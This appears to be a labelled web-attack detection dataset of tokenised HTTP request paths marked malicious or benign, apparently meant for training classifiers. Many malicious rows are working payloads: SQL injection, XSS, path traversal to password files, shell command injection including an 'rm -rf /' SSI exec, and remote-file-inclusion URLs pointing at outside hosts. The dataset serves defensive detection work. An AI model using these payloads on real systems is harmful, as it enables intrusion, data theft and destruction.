request	label
/ examples / jsp / num / news / index . dot ? id =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  / etc / passwd \ x00 . jpg 	1
/ admin / datasource . asp 	0
/ edv3mapy . mscgi ?  < script > cross_site_scripting . nasl <  / script > 	1
/ string / strings / parameters = 98058748l 	0
/ aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa .  .  .  .  .  .  { file } 	1
"/ top . php ? stuff =  ""  | ping \ xa0-w \ xa07000 \ xa0-n \ xa01 \ xa04 . 3 . 2 . 1 | rem \ xa0 "	1
/ string / modo = registro & login = galluzzi & password = 3nt7epa3es & nombre = laurentino & apellidos = arteaga + manzanares & email = m @ y @ asnikova @ show . nom @  . es & dni = 18445968z & direccion = calle + beato + nicolas + factor + 76 ,  +  & ciudad = ballesteros + de + calatrava & cp = 46148 & provincia = zamora & ntc = 1294969325590040 & b1 = registrar 	1
/ examples / jsp / error / texis . exe /  ? -dump 	1
/ mor dagor - necropedophilia / 	0
/ javascript / wtai . log 	0
/ string / modo = registro & login = correa & password = 5ortera & nombre = fructuosa & apellidos = polloni + homdedeu & email = berto @ sindualidad . dd & dni = 49742539w & direccion = c /  + einstein ,  + 147 ,  + 9 ? a & ciudad = legazpi & cp = 44349 '  ,  ' 0 '  )  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  --  & provincia = valencia & ntc = 2169388539628734 & b1 = registrar 	1
"/ string / strings / parameters = ""  & echo tfmdgn $  (  ( 33 + 82 )  )  $  ( echo tfmdgn ) tfmdgn ' "	1
/ string / modo = registro & login = darn & password = ahidalg , ado & nombre = ravi & apellidos = morell & email = costa_lejeune @ clichotel . my & dni = 16929821g & direccion = ingeniero + mario ,  + 170 + 10-a & ciudad = parets + del + valls & cp = 20577 & provincia = barcelona & ntc = 7457334236490109 & b1 = registrar 	1
/ string / strings / parameters = pankiw 	0
/ 142241 / 	0
/ string / strings / parameters = virgilia 	0
/ string / strings / parameters = 84276481l 	0
/ fridgemagnets / 	0
/  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / shadow 	1
/ string / modo = registro & login = hotson & password = 3u * 3m15i92 & nombre = talia & apellidos = sau + nobrega & email = siede @ comodepilarse . ye & dni = 10719743h & direccion = ponferrada + 65 + 10-c & ciudad = santa + colomba + de + somoza & cp = 12200 & provincia = sevilla & ntc = 1309699590331954 & b1 = registrar 	0
/ string / strings / parameters = -2797 '  )  )  )  union all select 5711 # 	1
/ string / modo = entrar & login =  +  & pwd = antagallar & remember = off & b1 = entrar 	1
/ string / strings / parameters = 61882626e 	0
/ 156263 / 	0
/ ppm_toitle / 	0
/ include / default_header . php ? script_path = http :  /  / 192 . 168 . 202 . 118 : 8080 / ghl9il ? 	1
/ en-us / account / apps / pbcs . dll / misc ? url =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / boot . ini 	1
/ 3643356i / 	0
"/ string / strings / parameters = ""  &  sleep 0  &  &  str =  $  ( echo gfpzmf )   &  &  str1 =  $  {  # str }   &  &   [  1 -eq  $  { str1 }   ]   &  &  sleep 1  /  / "	1
/ raplayer_1 / 	0
/ documentation / history . txt 	0
"/ top . php ? stuff =  ""  & rm q38114689  # "	1
"/ string / strings / parameters = -4012 ""  ""  )  or make_set ( 9354 = 9354 , 7185 )  and  (  ""  "" ccfn ""  ""  =  ""  "" ccfn "	1
/ shadows cast / 	0
/ string / strings / parameters = rosset 	0
/ clonecd5 / 	0
/ conserv_gallery / 	0
/ string / strings / parameters = 57rsant2541 	0
/ adopter / 	0
/ string / strings / parameters = $  { shell_exec ( print (  ` echo fdgahq `  .  ` echo  $  (  ( 87 + 87 )  )  `  .  ` echo fdgahq `  .  ` echo fdgahq `  )  ; fdgahq 	1
/ admin / classes / pear / ole / pps / file . php ? homedir = xxpathxx 	1
/ javascript / insert . xls 	0
/ string / strings / parameters = 1 '  )  )  rlike  ( select  *  from  ( select ( sleep ( 5 )  )  ) sgvo )  and  (  (  ' pemj '  =  ' pemj 	1
/ string / strings / parameters = 2am901to 	0
/ string / strings / parameters = 1 '  )  )  )  or  ( select  *  from  ( select ( sleep ( 5 )  )  ) ydpu )  and  (  (  (  ' ljhc '  =  ' ljhc 	1
/ string / str =  $  ( echo ixzjdx )   str1 =  $  {  # str }   if  [  2 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  \  \ 	1
/ scripts / spt -- forumtopics . php ? forumid = -9 union select null , null , null , 1332009308 , 4 , 5 	1
/ scripts / mail . php ? id =  '  /  *  *  / union /  *  *  / select /  *  *  / 1 , 2 , 1331905235 , 4 --  & blog = 1 	1
/ string / modo = entrar & login = bobbie7 +  & pwd = 8r126ec2o & remember = on & b1 = entrar 	1
/ robot2 / 	0
/ string / id = 1 & nombre = ques + o + manchego & precio = 85 & cantidad = 85 & b1 = aadir + al + carrito 	1
/ scriptpage / source / includes / load_forum . php ? mfh_root_path = http :  /  / 192 . 168 . 202 . 96 : 8080 / whmch8ftkt7kv ? 	1
/ string / strings / parameters = campillo 	0
/ string / strings / parameters = order by 16 	1
/ string / strings / parameters = gourtchenko @ cirujanaplastica . nl 	0
/ string / strings / parameters = palacios del pan 	0
/ string / modo = registro & login = burns40 & password = de6211gami5970 & nombre = samar & apellidos = aragons & email = ducaux @ muchachina . tk & dni = 42836631m & direccion = c /  + arroyo + de + las + pavas ,  + 183 ,  + 13 ? c & ciudad = cstaras & cp = 46940 & provincia = las + palmas & ntc = 0769789407660165 & b1 = registrar 	0
/ string / modo = insertar & precio = 7879 & b1 = confirmar / 	1
/ skitt ' s_law / 	1
/ javascript / system . bat 	0
"/ ybz5rz7a . mscgi ?  < meta http-equiv = set-cookie content =  "" testsbvw = 6289 ""  > "	1
/ bin / c32web . exe / getimage ? imagename = customeremail . txt \ x00 . pdf 	1
/ v_131088 / 	0
/ string / strings / parameters = 280 	0
"/ string / strings / parameters = ""  ;  str =  $  ( echo baksin )  ;  str1 =  $  {  # str }  ;  if  [  8 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  "" "	1
/ string / id = 2 & nombre = vino +  .  *  ? rioja & precio = 85 & cantidad = 58 & b1 = aadir + al + carrito 	1
/ string / modo = registro & login = checinsk & password = c2ad953u8ro & nombre = neria & apellidos = taronger & email = lopez_novis @ ocymafa .  @ et & dni = 74014005m & direccion = avenida + roque + de + gando ,  + 193 ,  + 7 ? e & ciudad = castrobol & cp = 26324 & provincia = cuenca & ntc = 5680554856223107 & b1 = registrar 	1
/ e040599p / 	0
/ javascript / registered . tpl 	0
/ string / strings / parameters = 79p2lis25 	0
/ finacle_solutions / 	0
/ admin / index . php ? path_to_script =  @ rfiurl ? cmd = ls & path_to_script =  @ rfiurl ? 	1
/ fat-ass / 	0
/ examples / jsp / sessions / index . php ? op = default & date = 200607 '  union select 1 , 1927066382 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 --  & blogid = 1 	1
/ string / strings / parameters = 1 )  where 5309 = 5309 or 7552 =  ( select count (  *  )  from rdb $ fields as t1 , rdb $ types as t2 , rdb $ collations as t3 , rdb $ functions as t4 )  -- 	1
"/ fmnveedu . mscgi ?  < script > document . cookie =  "" testgfbr = 7014 ;  ""  <  / script > "	1
/ eei78ore . htm ?  < script > cross_site_scripting . nasl <  / script > 	1
/ string / strings / parameters = 9521659963163883 	0
/ javascript / boot . csv 	0
/ javascript / showenv 	0
"/ b1q8bywu . php ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ cgi . cgi / ppdscgi . exe 	1
/ siguard-3 / 	0
/ cgi-bin / commsrss . php ? files [ 0 ]  =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd 	1
/ ppphonedenied / 	0
/ dnslogger / 	0
/ www_bget / 	0
/ bio_laats / 	0
/ string / strings / parameters = '  )  ; waitfor + delay +  ' 00 : 00 : 05 ' 	1
/ 2002juldec / 	0
/ javascript / servers . exe 	1
/ 050613 / 	0
/ edv3mapy . php3 ?  < script > cross_site_scripting . nasl <  / script > 	1
"/  ?  < meta http-equiv = set-cookie content =  "" testwhac = 3130 ""  > "	1
/ string / strings / parameters = &  sleep 0  &  &  str =  $  ( echo szmram )   &  &  str1 =  $  {  # str }   &  &   [  1 -eq  $  { str1 }   ]   &  &  sleep 1  \  \ 	1
/ main . php ? frm_daynight = day & frm_passwd = q15676662 & frm_referer = http :  /  / 192 . 168 . 24 . 202 /  & frm_user =  & scr_height =  & scr_width = 	1
/ rtpatch / 	0
/ string / strings / parameters = herminda 	0
/ safetytips / 	0
/ string / modo = entrar & login = clarette & pwd = 78102d84 ! am1nte & remember = off & b1 = entrar 	0
/ string / strings / parameters = 88 	0
/ examples / jsp / jsp2 / jspx / k / home ? dir =  /  & file =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd & lang = kor 	1
/ examples / jsp / sessions / btdownload . php ? type = torrent & file =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd 	1
/  .  .  % u2215 .  .  % u2215 .  .  % u2215 { file } 	1
/ sports_fans / 	0
"/ j2kdmfw4 . jsp ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ scripts / index . php ? act = sm_window & page = event & day = -1 union select 1 , 1331919215 , 154330261  -- 	1
/ mimesweeper / 	0
"/ string / strings / parameters = 1 %  ""  ""  )  ; call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 )  |  | char ( 69 )  |  | char ( 83 )  , null )  , 0 )  , 500000000 )  , null )  and  (  ""  ""  %  ""  ""  =  ""  "" "	1
/ troots2 / 	0
"/ string / strings / parameters = 1 ""  ""  )  as zopq where 2680 = 2680 ; select count (  *  )  from generate_series ( 1 , 5000000 )  -- "	1
/ 1563491 / 	0
/ javascript / sched . trace 	0
/ examples / servlets / servlet / add_url . htm ? node =  < script > alert (  ' xss '  )  <  / script > 	1
/ string / strings / parameters = 1 )  where 5261 = 5261 and elt ( 1210 = 1210 , sleep ( 5 )  )  -- 	1
/ mabry httpserver x v1 / 	0
/ chemical brothers - surrender / 	0
/ metodi / 	0
/ 3887493 / 	0
/ javascript / rest . jhtml 	0
"/ string / strings / parameters = < img src =  "" jav &  # x0d ; ascript : alert (  ' xss '  )  ;  ""  > "	1
/ javascript / definitions . swf 	0
/ javascript / exec . exe 	1
/ meekernews2-tm / 	0
/ cgi-win / query ? mss =  .  .  / config 	1
/ string / strings / parameters = -7378 '  or 6872 = 6872 and  ' bnmn '  like  ' bnmn 	1
/ 000118473 / 	0
"/ string / strings / parameters = ""  + if ( benchmark ( 3000000 , md5 ( 1 )  )  , null , null )  , null , null , null , null , null , null , null , null , null )   # "	1
"/ string / strings / parameters = 1 %  ""  ""   ( select  ( case when  ( 5451 = 5451 )  then regexp_substring ( repeat ( right ( char ( 5451 )  , 0 )  , 500000000 )  , null )  else char ( 108 )  |  | char ( 76 )  |  | char ( 112 )  |  | char ( 116 )  end )  from information_schema . system_users )  and  ""  ""  %  ""  ""  =  ""  "" "	1
/ string / strings / parameters = lugar los morros ,  50 ,  9 ? c 	0
/ string / strings / parameters = 1 '  in boolean mode )  ; select count (  *  )  from rdb $ fields as t1 , rdb $ types as t2 , rdb $ collations as t3 , rdb $ functions as t4 # 	1
/ string / strings / parameters = kulman 	0
"/ string / strings / parameters = 1 %  ""  ""  and 6969 =  ( select 6969 from pg_sleep ( 5 )  )  and  ""  ""  %  ""  ""  =  ""  "" "	1
/ string / strings / parameters = 04740 	0
/ javascript / batch . pem 	0
/ string / strings / parameters = 1 '  )  as lgex where 4068 = 4068 and 1378 = 9247 -- 	1
"/ string / strings / parameters = 1 %  ""  ""  )  ; select  ( case when  ( 4666 = 4666 )  then 1 else 4666 *  ( select 4666 from master .  . sysdatabases )  end )  -- "	1
/  .  .  \  .  .  \  \  .  .  \  .  .  \  \  { file } 	1
/ string / strings / parameters = c /  arquitecto hernandez rubio ,  101 ,  1h 	0
/ javascript / trailers . msg 	0
/ dduo2156z / 	0
/ examples / jsp / colors / direct . php ? rf =  / etc / passwd \ x00 	1
/ string / strings / parameters = 43896 	0
/ recordings / webplus . exe ? script = webplus_install_path . nasl 	1
/ javascript / notifications . old 	0
"/ string / strings / parameters = < div style =  "" background-image :  \ 0075 \ 0072 \ 006c \ 0028 '  \ 006a \ 0061 \ 0076 \ 0061 \ 0073 \ 0063 \ 0072 \ 0069 \ 0070 \ 0074 \ 003a \ 0061 \ 006c \ 0065 \ 0072 \ 0074 \ 0028 . 1027 \ 0058 . 1053 \ 0053 \ 0027 \ 0029 '  \ 0029 ""  > "	1
/ string / strings / parameters = '  echo dwdukp $  (  ( 90 + 61 )  )  $  ( echo dwdukp ) dwdukp /  / 	1
"/ string / strings / parameters = 1 ""  ""  )  )  union all select null , null , null , null , null , null # "	1
/ 19991123 / 	0
/ string / strings / parameters = 89740217j 	0
/ string / modo = registro & login = shutterb & password = 4ntorchar & nombre = noam & apellidos = samper + folco & email = menant @ venderfotografias . se & dni = 33151406b & direccion = calle + aladierna ,  + 85 + 3 ? a & ciudad = burujn & cp = 28648 & provincia = barcel ? ona & ntc = 1260473774275985 & b1 = registrar 	1
"/ string / strings / parameters = -9119 ""  ""  )  where 9237 = 9237 or 8571 = 8571 -- "	1
"/ v3axg1p8 . nsf ?  < script > document . cookie =  "" testxagh = 6987 ;  ""  <  / script > "	1
"/ 1r8cfrlf . do ?  < script > document . cookie =  "" testydan = 5106 ;  ""  <  / script > "	1
/ p54-11 / 	0
/ 128197 / 	0
/ string / strings / parameters = 1 )  as rsyw where 4857 = 4857 or  ( select 2 *  ( if (  ( select  *  from  ( select concat ( 0x7171706a71 ,  ( select  ( elt ( 8113 = 8113 , 1 )  )  )  , 0x717a767a71 , 0x78 )  ) s )  ,  8446744073709551610 ,  8446744073709551610 )  )  )  -- 	1
/ sysuser / docmgr / vccreate . stm ? path =  < script > alert ( document . cookie )  <  / script > 	1
/ carisoprodol-5 / 	0
/ mulepat / 	0
"/ string / strings / parameters = < script src =  "" http :  /  / ha . ckers . org / xss . jpg ""  >  <  / script > "	1
/ phprint . php ? module = vtiger_lang_crm_lfi . nasl & action = 1331919143 & lang_crm =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  / boot . ini \ x00 	1
"/ string / strings / parameters = < a href =  '  #  '  onmouseover  =  "" javascript :  $  (  ' a '  )  . html ( 5 )  ""  > a link <  / a > "	1
/ cat_accounting / 	0
/ giveituptome / 	0
/ javascript / pl . err 	0
"/ top . php ? stuff =  "" rm \ xa0q69465625 & rem \ xa0 "	1
"/ string / strings / parameters = 1 ""  ""  )  and  ( select 9067 from ( select count (  *  )  , concat ( 0x7171706a71 ,  ( select  ( elt ( 9067 = 9067 , 1 )  )  )  , 0x717a767a71 , floor ( rand ( 0 )  * 2 )  ) x from information_schema . character_sets group by x ) a )  and  (  ""  "" jhtc ""  ""  like  ""  "" jhtc "	1
/ admin / doeditconfig . php ? thispath =  .  .  / includes & config [ path ]  = http :  /  / 192 . 168 . 202 . 96 : 8080 / txenjrxf3 ? 	1
/ javascript / dirs . exe 	1
/ javascript / tape . java 	0
/ ref030605 / 	0
"/ string / strings / parameters = < meta http-equiv = set-cookie content =  "" testrhbc = 8184 ""  > "	1
/ 0764575910-1 / 	0
/ string / modo = entrar & login = tape & pwd = plumero & remember = on & b1 = entrar 	0
/ layout_06 / 	0
/ cgi-bin / cmd . exe ?  / c + dir 	1
/ msg27906 / 	0
"/ string / strings / parameters = < script > x =  ""  ""  > prompt ( 9 )  >  ""  ""  ; y = 42 ;  <  / script > "	1
/ javascript / temp . yml 	0
/ string / modo = registro & login = brinn & password = huyente & nombre = nao & apellidos = guinaldo + guals & email = wailing @ mariposasentudia . je & dni = 52218392c & direccion = travesia + palacio + 61 ,  + 1 ? d & ciudad = vencilln & cp = 31439 & provincia = teruel & ntc = 9129793967568864 & b1 = registrar 	0
"/ string / strings / parameters = ""  >  < script >  `  #  $  { prompt ( 1 )  }  #  `  <  / script > "	1
/ xtra_hub / 	0
/ string / strings / parameters = < svg >  < script > 123 < 1 > alert ( 123 )  <  / script > 	1
/ string / strings / parameters = 1 '  )  )  )  ; select  ( case when  ( 6276 = 6276 )  then 6276 else 6276 *  ( select 6276 from information_schema . character_sets )  end )  # 	1
/ 000043844 / 	0
/ bin / fpremadm . exe 	1
/ string / modo = entrar & login = ji-chuu & pwd = p05f74a . r & remember = on & b1 = entrar 	0
/ canterville ghost / 	0
/ main . php ? logout =  '  & del q25729498  # 	1
/ scgi-bin / fileseek2 . cgi ? foot =  & head =  .  .  .  .  /  /  .  .  .  .  /  /  .  .  .  .  /  /  .  .  .  .  /  /  .  .  .  .  /  /  .  .  .  .  /  /  .  .  .  .  /  / etc / passwd 	1
/ javascript / sex . err 	0
/ news / index . dot ? id =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  / etc / passwd \ x00 . jpg 	1
"/ string / strings / parameters = < div id =  "" 88 ""  >  < svg xmlns =  "" http :  /  / www . w3 . org / 2000 / svg ""  xmlns : xlink =  "" http :  /  / www . w3 . org / 1999 / xlink ""  > "	1
/ cgibin / htimage . exe / path / filename ? 2 , 2 	1
/ 1576875 / 	0
/ misc / function . php3 ? path = xxpathxx ? 	1
/ string / strings / parameters = 92086641t 	0
/ 85779-01 / 	0
/ string / strings / parameters = 8888 	0
/ 136030 / 	0
/ main . php ? stuff =  '  \ x0dsleep \ x098 \ x09 # 	1
/ 000103701 / 	0
/ string / strings / parameters = eliseo 	0
/ cgibin / vssetcookie . exe 	1
/ lsoix5h3 . pl ?  < script > cross_site_scripting . nasl <  / script > 	1
/ b00005nipp / 	0
/ 666 \ x0a \ x0a < script > alert (  ' vulnerable '  )  ;  <  / script > 666 . jsp 	1
/ javascript / cgi-local . pfx 	0
/ javascript / is . lst 	0
/  /  < body >  < script src = http :  /  / www . example . com / test ? rnd = q77447371 >  <  / script > 	1
"/ help . php ? q =  "" rm q26428197 & rem "	1
/ 111862 / 	0
/ string / strings / parameters = -9382 '  )  union all select 4774 , 4774 , 4774 , 4774 -- 	1
"/ string / strings / parameters = 1 ""  ""  ; select benchmark ( 5000000 , md5 ( 0x4c4d6142 )  ) "	1
/ gallery / displaycategory . php ? basepath = xxpathxx 	1
/ javascript / trailers . xls 	0
/ javascript / hire . html 	0
/ javascript / onbound . ws 	0
/ index . php ? cat_select =  < script > foo <  / script > 	1
/ eresources-news / 	0
/ stoppages / 	0
/ cgi-bin / faq . php ? action =  & type = view & s =  & id = -1 '  union select 0 , 261058722 , 0 , 0 , 0 , 0 , 0 -- 	1
/ bb219490 / 	0
"/ xsqln7eb . exe ?  < meta http-equiv = set-cookie content =  "" testpcbb = 9254 ""  > "	1
/ string / modo = registro & login = babatund & password = pa6omer9-a & nombre = juana + del + pilar & apellidos = luna + barberan & email = mazurowna @ wdsl . om & dni = 19546963e & direccion = villadangos + del + paramo ,  + 82 ,  +  & ciudad = encinas + de + esgueva & cp = 10830 & provincia = barce + lon ?  / a & ntc = 5365738910346806 & b1 = registrar 	1
/ orleanist / 	0
/ murdoch_press / 	0
"/ string / modo = entrar & login = leppert & pwd =  <  !  --  # exec + cmd =  "" rm + -rf +  /  ; cat +  / etc / passwd ""  +  --  >  & remember = on & b1 = entrar "	1
/ string / strings / parameters = 1 '  )  )  as bswc where 1635 = 1635 and 7756 = dbms_utility . sqlid_to_sqlhash (  ( chr ( 113 )  |  | chr ( 113 )  |  | chr ( 112 )  |  | chr ( 106 )  |  | chr ( 113 )  |  |  ( select  ( case when  ( 7756 = 7756 )  then 1 else 0 end )  from dual )  |  | chr ( 113 )  |  | chr ( 122 )  |  | chr ( 118 )  |  | chr ( 122 )  |  | chr ( 113 )  )  )  -- 	1
